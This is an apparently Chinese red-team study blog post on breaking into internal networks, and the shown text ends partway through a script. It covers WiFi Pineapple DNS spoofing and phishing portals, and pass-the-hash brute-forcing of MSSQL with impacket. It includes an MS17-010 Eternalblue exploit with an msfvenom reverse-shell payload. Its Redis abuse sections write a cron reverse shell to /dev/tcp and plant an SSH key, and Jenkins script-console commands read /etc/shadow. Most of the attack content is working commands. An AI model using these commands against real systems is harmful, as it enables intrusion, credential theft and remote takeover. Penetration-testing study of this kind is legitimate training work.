<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/favicon.png"><link rel="icon" type="image/png" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚"><meta name="author" content="iceH"><meta name="keywords" content=""><title>红队攻防学习之打点进内网 - iceH’s Blog</title><link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/gundongtiao.css# 滚动条颜色.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/shubiao.css# 鼠标指针.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/valine.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"www.secice.cn",root:"/",version:"1.8.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},copy_btn:!0,image_zoom:{enable:!0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
</head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="iconfont icon-books"></i> 博文</a><div class="dropdown-menu" aria-labelledby="navbarDropdown"><a class="dropdown-item" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档 </a><a class="dropdown-item" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类 </a><a class="dropdown-item" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></div></li><li class="nav-item"><a class="nav-link" href="/playlist/"><i class="iconfont icon-music"></i> 音乐</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner intro-2" id="background" parallax="true" style="background:url(https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/background1.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="红队攻防学习之打点进内网"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-12-17 12:17" pubdate>2020年12月17日 中午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 17.1k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 234 分钟</span></div></div></div></div></div></header><main><div class="container-fluid"><div class="row"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-md"><div class="container nopadding-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">红队攻防学习之打点进内网</h1><div class="markdown-body"><h1 id="二、打点-进入内网"><a href="#二、打点-进入内网" class="headerlink" title="二、打点-进入内网"></a>二、打点-进入内网</h1><div class="note note-primary"><p>这一章节的内容较多，一时啃不完，部分内容粗略带过，后续有时间再单独写笔记</p></div><h2 id="1、外部接入点-WiFi"><a href="#1、外部接入点-WiFi" class="headerlink" title="1、外部接入点-WiFi"></a>1、外部接入点-WiFi</h2><h3 id="无线攻击实战应用之-DNSSpoof、Evil-Portal、DWall组合拳入侵（配合）"><a href="#无线攻击实战应用之-DNSSpoof、Evil-Portal、DWall组合拳入侵（配合）" class="headerlink" title="无线攻击实战应用之 DNSSpoof、Evil Portal、DWall组合拳入侵（配合）"></a>无线攻击实战应用之 DNSSpoof、Evil Portal、DWall组合拳入侵（配合）</h3><p>前言：主要向大家介绍 <code>WiFi Pineapple</code>（以下简称“菠萝”）设备的基本使用方法，以及通过菠萝中的几个模块达到中间人攻击，网站钓鱼和获得shell。文章中主要使用到<code>DWall</code>、<code>Evil Portal</code>与<code>DNSMasq Spoofv</code>三个模块</p><p>Pineapple开启与网络桥接将菠萝的按钮由off划到wifi标志，稍等片刻便会向周围发射两个无线信号。一个无线信号是菠萝的管理ap，一个是给受害者使用的开放ap。这两个ap的ssid以及管理ap的密码均可以在菠萝的web管理界面中设置</p><p><a target="_blank" rel="noopener" href="http://www.wifipi.org:8080/WiFiPineapple-%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C-V1.3.pdf">http://www.wifipi.org:8080/WiFiPineapple-用户手册-V1.3.pdf</a><br><a target="_blank" rel="noopener" href="https://shop.hak5.org/products/wifi-pineapple">https://shop.hak5.org/products/wifi-pineapple</a></p><p>参考该资料以及购买菠萝设备连接！</p><p>由于穷，买不起的原因，只能</p><h3 id="简单总结一下利用模块解释："><a href="#简单总结一下利用模块解释：" class="headerlink" title="简单总结一下利用模块解释："></a>简单总结一下利用模块解释：</h3><h4 id="Evil-Portal"><a href="#Evil-Portal" class="headerlink" title="Evil Portal"></a><strong>Evil Portal</strong></h4><p>可以利用Evil Portal模块获取TP-LINK管理员密码，它的作用是可以使接入用户在访问任意网站时都跳转到我们事先设置好的 Landing page中。 Landing Page是设置菠萝网关的页面，此处我们重定向到公网上一台配置好钓鱼网站的vps上，也可给菠萝添加一张sd卡，直接将钓鱼网站文件放置到菠萝中</p><h4 id="Dwall"><a href="#Dwall" class="headerlink" title="Dwall"></a><strong>Dwall</strong></h4><p>使用DWall进行中间人攻击DWall中文名称叫”绵羊墙”，是菠萝中的一个默认安装模块，它可以嗅探已连接客户端的所有HTTP请求，如URLS、Cookies、Post Data，以及实时地显示出客户端正在浏览的图片等</p><h4 id="DNSSpoof"><a href="#DNSSpoof" class="headerlink" title="DNSSpoof"></a><strong>DNSSpoof</strong></h4><p>此处使用到菠萝中的 DNSMasq spoc模块。它的作用是dns劫持，获取到受害客户端的域名解析控制权。我们可以在hosts中设置想要进行欺骗的域名，当用户输入该域名后，模块会欺骗用户将域名解析成设置好的IP，此处我们设置跳转到菠萝网关上</p><p>DNSSpoof模块可以尝试获取shell，可以尝试使受害者重定向到一台公网上的vps来下载木马文件，诱导受害者点击。木马文件可精心构造，比如具有欺骗性的文件名，免杀木马等。</p><h4 id="DNS欺骗原理"><a href="#DNS欺骗原理" class="headerlink" title="DNS欺骗原理"></a><strong>DNS欺骗原理</strong></h4><p>DNS服务器工作原理是，存储IP地址到DNS名称映射的记录（称为资源记录）数据库，联系这些资源记录与客户端，并将这些资源记录与其他DNS服务器联系。而客户端对于每个通过互联网发送的DNS请求都包含一个独特的识别码，其目的在于辨识查询和响应，并将对应的查询和响应配对在起。这就意味着，如果我们可以拦截客户端发送的DNS请求包，做一个包含该识别码的假数据包，这样目标计算机就会根据识别码认为这个假数据包就是其需要的结果，从而接受我们发送的包。这里尝试使用nslookup查看域名解析情况，用tracert命令跟踪：无修改，dns欺骗，配置静态dns，三种情况下访问测试域名的路由情况</p><h3 id="防护意见"><a href="#防护意见" class="headerlink" title="防护意见"></a>防护意见</h3><ul><li>配置静态可靠的dns</li><li>将访问的重要域名与P地址进行绑定</li><li>提高安全意识,不轻易连接不可信的、开放的无线热点</li></ul><hr><h2 id="2、应用系统漏洞利用"><a href="#2、应用系统漏洞利用" class="headerlink" title="2、应用系统漏洞利用"></a>2、应用系统漏洞利用</h2><h3 id="常见漏洞扫描"><a href="#常见漏洞扫描" class="headerlink" title="常见漏洞扫描"></a>常见漏洞扫描</h3><h4 id="Nmap扫描漏洞技巧"><a href="#Nmap扫描漏洞技巧" class="headerlink" title="Nmap扫描漏洞技巧"></a>Nmap扫描漏洞技巧</h4><ul><li>auth 处理身份验证<ul><li>broadcast 网络广播<ul><li>brute 暴力猜解</li><li>default默认</li></ul></li><li>discovery 服务发现<ul><li>dos 拒绝服务</li><li>exploit漏洞利用</li><li>external外部扩展</li><li>fuzzer 模糊测试</li></ul></li><li>intrusive 扫描可能造成不良后果</li><li>malware 检测后门<ul><li>safe 扫描危害较小</li><li>version 版本识别</li><li>vuln 漏洞检测</li></ul></li></ul></li></ul><h5 id="通用参数-vuln"><a href="#通用参数-vuln" class="headerlink" title="通用参数 -vuln"></a><strong>通用参数 -vuln</strong></h5><pre><code class="hljs bash">nmap --script=vuln 192.168.1.105</code></pre><h5 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a><strong>MS17-010</strong></h5><pre><code class="hljs bash">nmap --script=smb-vuln-ms17-010 192.168.1.105</code></pre><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/01.png" srcset="/img/loading.gif" alt="MS17-010"></p><hr><h4 id="impacket框架之mssql服务器安全检测"><a href="#impacket框架之mssql服务器安全检测" class="headerlink" title="impacket框架之mssql服务器安全检测"></a>impacket框架之mssql服务器安全检测</h4><p>在实际渗透测试工作中经常会遇到检测项目中mssq服务器安全性,此篇文章介绍 <code>impack</code>框架中 <code>mssqlclient</code>的使用方法。</p><h5 id="mssqlclient与其他工具相比的优势"><a href="#mssqlclient与其他工具相比的优势" class="headerlink" title="mssqlclient与其他工具相比的优势"></a>mssqlclient与其他工具相比的优势</h5><ol><li>跨平台，python脚本编写，并且已有exe版本</li><li>命令行执行，速度快</li><li>支持使用 socks代理传输数据</li><li>支持以hash传递的方式进行账号验证</li><li>支持 windows认证模式进行mssq服务的安全检测</li><li>执行sq命令可以是交互式,也可以直接回显sq命令执行结果</li></ol><h5 id="win和linux环境下使用"><a href="#win和linux环境下使用" class="headerlink" title="win和linux环境下使用"></a><strong>win和linux环境下使用</strong></h5><p>1）在windows环境下使用windows认证模式，mssqlclient测试登陆sqlserver服务器，账号验证通过后会直接返回 sql shell</p><pre><code class="hljs bash">mssqlclient.exe admin/admin123@192.168.1.105 -windows-auth</code></pre><p>2）通过 socks代理，在linux环境下使用 windows认证模式，mssqlclient测试登陆 sqlserver服务器，账号验证通过后会直接返回 sql shell</p><pre><code class="hljs bash">proxychains python mssqlclient.py sa/admin123@192.168.x.x -windows-auth</code></pre><p>3）通过 socks代理，以mssql账号验证方式测试登陆mssql服务器，账号验证成功后执行mssql. txt内的sql命令</p><pre><code class="hljs bash">proxychains python mssqlclient.py ./sa:admin123@192.168.x.x -file mssql.txt</code></pre><p>4）通过 socks代理，在linux环境下使用 windows认证模式，mssqlclient测试登录sqlserver服务器，账号验证成功后执行 command.txt内的sql命令</p><pre><code class="hljs bash">proxychains python mssqlclient.py -p 1433 admin/sa:admin123@192.168.x.x -windows-auth -file cpmmand.txt</code></pre><p>5）在windows环境下使用windows认证模式，使用ntlm hash验证方式，mssqlclient测试登陆sqlserver服务器，账号验证成功后执行command.txt内的sql命令</p><pre><code class="hljs shell">mssqlclient.exe -p 1433 -hashes :&quot;hash值&quot; admin/sqladmin@192.168.x.x -file command.txt -windows-auth</code></pre><p>同样也可以用于webshell环境下</p><h5 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a><strong>批量检测</strong></h5><p>除此之外，还可以批量检测内网 SQL server服务器的账号安全性<br>需要准备的文件有：</p><ul><li>mssqlclient.exe(必须)</li><li>command.txt(必须)</li></ul><p>以下四个文件需选其一：</p><ul><li>hashes.txt （需验证的 ntlm hash字符串列表）<ul><li>username.txt （需验证的 username列表）<ul><li>password.txt（需验证的密码字符串列表）<ul><li>Ips.txt （需验证的p字符串列表）</li></ul></li></ul></li></ul></li></ul><p><strong>举例以下几种批量检测的bat脚本内容</strong></p><p>1）测试以 windows认证模式，使用hash传递验证，使用 mssqlclient批量测试登陆 sqlserver服务器，Ips.txt 内容为待检测sqlserver服务ip，每行一条</p><pre><code class="hljs shell">FOR /F %%i in (ips.txt) do mssqlclient.exe -p 1433 -hashes :hash值 ......</code></pre><p>2）测试以 windows认证模式，使用hash传递验证，指定主机 ntlm hash遍历验证，hashes.txt为待检测已知 ntlm hash内容，每行一条</p><pre><code class="hljs shell">FOR /F %%i in (hashes.txt) do mssqlclient.exe -p 1433 -hashes %%i domain/adminis.......</code></pre><p>3）测试以 sqlserver认证模式，指定待检测主机，遍历验证 passwords.txt 内密码有效性，passwords.txt为已知密码内容，每行一条，验证成功后执行 command.txt内sql命令</p><pre><code class="hljs shell">FOR /F %%i in (passwords.txt) do mssqlclient.exe -p 1433 ./sa:%%i@192.168.x.x ....</code></pre><p>4）测试以 sqlserver认证模式，指定待检测密码，遍历验证ip.txt内所有服务器，ip.txt为待检测sqlserver服务器，每行一条，验证成功后执行 command. txt内sql命令</p><pre><code class="hljs shell">FOR /F %%i in (ips.txt) do mssqlclient.exe -p 1433 ./sa:password123@%%1i -file ......</code></pre><p>这四种命令补全查看前面的讲解即可，或者查看参考资料</p><h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a><strong>参考资料：</strong></h5><ul><li><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a> –下载</li><li><a target="_blank" rel="noopener" href="https://www.puckiestyle.nl/impacket/">https://www.puckiestyle.nl/impacket/</a></li><li><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/issues/613">https://github.com/SecureAuthCorp/impacket/issues/613</a></li></ul><hr><h4 id="MS17010py脚本利用"><a href="#MS17010py脚本利用" class="headerlink" title="MS17010py脚本利用"></a>MS17010py脚本利用</h4><h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>为什么要介绍用py脚本，因为有些机器存在漏洞，但是使用MSF的模块利用失败，而使用py脚本则能成功利用</p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h5><p>在本地用虚拟机搭建了Kail 和 Windows7系统</p><pre><code class="hljs dns">windwos7靶机IP：<span class="hljs-number">192.168.1.105</span>
kali：<span class="hljs-number">192.168.1.104</span>
操作机：<span class="hljs-number">192.168.1.106</span></code></pre><p><strong>Kali生成木马dll</strong></p><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=192.168.1.104 <span class="hljs-attribute">lport</span>=4444 -f dll &gt; 64.dll
msfconsole		进入控制台
use exploit/multi/handler 
<span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp
<span class="hljs-builtin-name">set</span> lhost 192.168.1.104
<span class="hljs-builtin-name">set</span> lport 4444
run</code></pre><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/02.png" srcset="/img/loading.gif" alt="生成dll文件"></p><p><strong>操作机</strong></p><p>py下载地址：fb.py</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/misterch0c/</span>shadowbroker<span class="hljs-regexp">/tree/m</span>aster/windows</code></pre><p>1)设置ip<br>2)<code>use Eternalblue</code>使用 Eternalblue插件<br>3)<code>use doublepulsar</code>使用 doublepulsar插件<br>4)最后执行dll反弹shell<br>操作步骤不截图了挺简单的…<br><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/03.png" srcset="/img/loading.gif" alt="成功弹回会话"></p><hr><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>这类问题覆盖的应用、利用方式较广，因此只举例频次较高的漏洞</p><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><strong>Redis</strong></h4><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库</p><p><strong>reds-cli</strong></p><pre><code class="hljs bash">redis-cli -h 192.168.1.106 -p 6379</code></pre><p><strong>写入文件</strong></p><pre><code class="hljs bash">redis 192.168.1.106:6379&gt; CONFIG GET dir
1) <span class="hljs-string">&quot;dir&quot;</span>
2) <span class="hljs-string">&quot;C:\\Users\\Administrator\\Desktop\\Redis\\Redis&quot;</span>
redis 192.168.1.106:6379&gt; CONFIG <span class="hljs-built_in">set</span> dir C:/
OK
redis 192.168.1.106:6379&gt; SET foobar <span class="hljs-string">&quot;who are you? iceH&quot;</span>
OK
redis 192.168.1.106:6379&gt; CONFIG GET dbfilename
1) <span class="hljs-string">&quot;dbfilename&quot;</span>
2) <span class="hljs-string">&quot;dump.rdb&quot;</span>
redis 192.168.1.106:6379&gt; CONFIG SET dbfilename write_file.log
OK
redis 192.168.1.106:6379&gt; save
OK
redis 192.168.1.106:6379&gt;</code></pre><p><img src="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20201217_%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%89%93%E7%82%B9%E8%BF%9B%E5%86%85%E7%BD%91/04.png" srcset="/img/loading.gif" alt="redis写文件"></p><p><strong>反弹shell-Linux</strong></p><pre><code class="hljs bash">127.0.0.1:6379 &gt; <span class="hljs-built_in">set</span> shell <span class="hljs-string">&quot;\n* * * * *  bash -i &gt;&amp; /dev/tcp/1.1.1.1/88 0&gt;&amp;1\n&quot;</span> 
OK
127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dir /var/spool/cron/
OK
127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename root 
OK
127.0.0.1:6379 &gt; save
[238] xx May xx:xx:xx DB saved on disk
OK</code></pre><p><strong>写入公钥</strong><br>生成公钥：</p><pre><code class="hljs bash">ssh-keygen-t rsa   	一直回车即可</code></pre><pre><code class="hljs bash">127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dir /root/.ssh/
OK
127.0.0.1:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename authorized_keys
OK
127.0.0.1:6379 &gt; <span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n\n\nssh-rsa xxxxxx root@kali\n\n\n&quot;</span>
OK
127.0.0.1:6379 &gt; save
OK</code></pre><p><strong>清空数据库</strong></p><pre><code class="hljs bash">172.16.x.x:6379 &gt; FLUSHALL</code></pre><hr><h3 id="未授权漏洞总结"><a href="#未授权漏洞总结" class="headerlink" title="未授权漏洞总结"></a>未授权漏洞总结</h3><p>这一部分，书上不咋详细，等有时间我再单独发笔记</p><h4 id="Redis-1"><a href="#Redis-1" class="headerlink" title="Redis"></a>Redis</h4><p><strong>计划任务反弹shell</strong></p><p>利用计划任务执行命令反弹shell</p><p>在<code>redis</code>以<code>root</code>权限运行时可以写<code>crontab</code>来执行命令反弹shell<br>先在自己的服务器上监听一个端口</p><pre><code class="hljs bash">nc -lvnp 8989</code></pre><p>然后执行命令：</p><pre><code class="hljs bash">redis-cli -h 192.168.x.x
192.168.x.x:6379 &gt; <span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\n* * * * *  bash -i &gt;&amp; /dev/tcp/1.1.1.1/8989 0&gt;&amp;1\n&quot;</span>
192.168.x.x:6379 &gt; config <span class="hljs-built_in">set</span> dir /var/spool/cron/
192.168.x.x:6379 &gt; config <span class="hljs-built_in">set</span> dbfilename root
192.168.x.x:6379 &gt; save</code></pre><p><strong>写入公钥</strong><br>获取rsa</p><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span></code></pre><p>将公钥写入foo.txt，注意内容前后要加2个换行</p><pre><code class="hljs lsl">(echo -e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>; cat /root/ssh/id_rsa.pub; echo -e <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span>) &gt; foo.txt</code></pre><p>将foo.txt放入键crackit里</p><pre><code class="hljs routeros">cat foo.txt redis-cli -h<span class="hljs-built_in"> IP </span>-x <span class="hljs-builtin-name">set</span> crackit</code></pre><p>连接目标</p><pre><code class="hljs x86asm">redis-<span class="hljs-keyword">cli</span> -h <span class="hljs-built_in">Ip</span></code></pre><p>设置目标的redis的配置文件<br>设置数据库备份目录为/root/.ssh/</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.X</span><span class="hljs-selector-class">.X</span>: 6379 &gt; <span class="hljs-selector-tag">config</span> <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">dir</span> /<span class="hljs-selector-tag">root</span>/<span class="hljs-selector-class">.ssh</span>/</code></pre><p>设置数据库备份文件名为authorized_keys</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.X</span><span class="hljs-selector-class">.X</span><span class="hljs-selector-pseudo">:6379</span> &gt; <span class="hljs-selector-tag">config</span> <span class="hljs-selector-tag">set</span> <span class="hljs-selector-tag">dbfilename</span> <span class="hljs-selector-tag">authorized_keys</span></code></pre><p>此时公钥成功写入目标机子，文件名为authorized_keys</p><pre><code class="hljs css">192.168<span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-pseudo">:6379</span> &gt; <span class="hljs-selector-tag">save</span></code></pre><p>利用私钥链接目标</p><pre><code class="hljs llvm">ssh -i /root/.ssh/id_rsa root<span class="hljs-title">@192</span>.<span class="hljs-number">168</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span> 
set <span class="hljs-keyword">x</span> <span class="hljs-string">&quot;\n\n\n</span></code></pre><p>参考资料：</p><ul><li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000009811404">https://segmentfault.com/a/1190000009811404</a></li><li><a target="_blank" rel="noopener" href="https://github.com/andymccurdy/redis-py">https://github.com/andymccurdy/redis-py</a></li></ul><hr><h4 id="Jenkins"><a href="#Jenkins" class="headerlink" title="Jenkins"></a>Jenkins</h4><p>默认是8080端口未授权访问就是任意用户都能访问都能执行命令</p><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:8080</span>/jenkins/manage
<span class="hljs-number">127.0.0.1:8080</span>/jenkins/script</code></pre><p><strong>常用命令集合：</strong></p><pre><code class="hljs arduino"><span class="hljs-built_in">println</span> <span class="hljs-string">&quot;whoami&quot;</span>.execute().<span class="hljs-built_in">text</span></code></pre><p><strong>Linux：</strong></p><pre><code class="hljs css"><span class="hljs-selector-tag">println</span> <span class="hljs-selector-tag">ifconifg</span> <span class="hljs-selector-tag">-a</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span>
<span class="hljs-selector-tag">println</span> &quot;<span class="hljs-selector-tag">cat</span> /<span class="hljs-selector-tag">etc</span>/<span class="hljs-selector-tag">passwd</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span>
<span class="hljs-selector-tag">printin</span>&quot;<span class="hljs-selector-tag">cat</span> /<span class="hljs-selector-tag">etc</span>/<span class="hljs-selector-tag">shadow</span>&quot;<span class="hljs-selector-class">.execute</span>()<span class="hljs-selector-class">.text</span></code></pre><p><strong>Windows：</strong></p><pre><code class="hljs gradle"><span class="hljs-keyword">println</span> <span class="hljs-string">&quot;ipconfig /all&quot;</span>.execute().text
<span class="hljs-keyword">def</span> sout = <span class="hljs-keyword">new</span> StringBuffer(), serr = <span class="hljs-keyword">new</span> StringBuffer()
<span class="hljs-keyword">def</span> proc = <span class="hljs-string">&#x27;ipconfig&#x27;</span>.execute()
proc.consumeProcessOutput(sout, serr)
proc.<span class="hljs-keyword">waitForOrKill</span>(<span class="hljs-number">1000</span>)
<span class="hljs-keyword">println</span> <span class="hljs-string">&quot;out&gt; $sout err&gt; $serr&quot;</span></code></pre><p><strong>更多可参考：</strong></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangpeng999123/article/details/108227041">https://blog.csdn.net/zhangpeng999123/article/details/108227041</a></p><hr><h4 id="Mongodb"><a href="#Mongodb" class="headerlink" title="Mongodb"></a>Mongodb</h4><p>利用可视化工具连接默认端口：28017<br>推荐Robo3t 1.1 即可</p><p>python mongodb_unauth.py</p><pre><code class="hljs python">coding:utf-<span class="hljs-number">8</span>
mongodb未授权检测脚本
usage: python3 mongodb_unauth.py ip port
默认端口<span class="hljs-number">28017</span>和<span class="hljs-number">27017</span>

<span class="hljs-keyword">from</span> pymongo <span class="hljs-keyword">import</span> MongoClient
<span class="hljs-keyword">import</span> sys

ip = sys.argv[<span class="hljs-number">1</span>] 

port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) 

<span class="hljs-keyword">try</span>:
	conn = MongoClient(ip, port, socketTimeoutMS=<span class="hljs-number">5000</span>)	<span class="hljs-comment">#连接 MongoDB，延时5秒</span>
	dbs = conn.database_names()
	print(<span class="hljs-string">&#x27;[ok] -&gt; &#123;&#125;:&#123;&#125; database_names : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port, dbs))
	conn.close() 
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
	error = e.args
	print(<span class="hljs-string">&#x27;[-] -&gt; &#123;&#125;:&#123;&#125; error : &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(ip, port, error))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> mongodb_unauth.py <span class="hljs-number">192.168.175.1</span> <span class="hljs-number">27017</span></code></pre><hr><h4 id="ZooKeeper"><a href="#ZooKeeper" class="headerlink" title="ZooKeeper"></a>ZooKeeper</h4><p>默认端口：2181、2171</p><pre><code class="hljs shell">ls / 	#查看所有节点 
get /	#获取某个节点信息</code></pre><p>脚本检测</p><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span>
<span class="hljs-keyword">import</span> socket


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_plugin_info</span>():</span>
    plugin_info = &#123;
        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Zookeeper未授权访问&quot;</span>,
        <span class="hljs-string">&quot;info&quot;</span>: <span class="hljs-string">&quot;Zookeeper Unauthorized access&quot;</span>,
        <span class="hljs-string">&quot;level&quot;</span>: <span class="hljs-string">&quot;中危&quot;</span>,
        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;未授权访问&quot;</span>,
        <span class="hljs-string">&quot;author&quot;</span>: <span class="hljs-string">&quot;c4bbage@qq.com&quot;</span>,
        <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;https://hackerone.com/reports/154369&quot;</span>,
        <span class="hljs-string">&quot;keyword&quot;</span>: <span class="hljs-string">&quot;server:Zookeeper&quot;</span>,
        <span class="hljs-string">&quot;source&quot;</span>: <span class="hljs-number">1</span>
    &#125;
    <span class="hljs-keyword">return</span> plugin_info


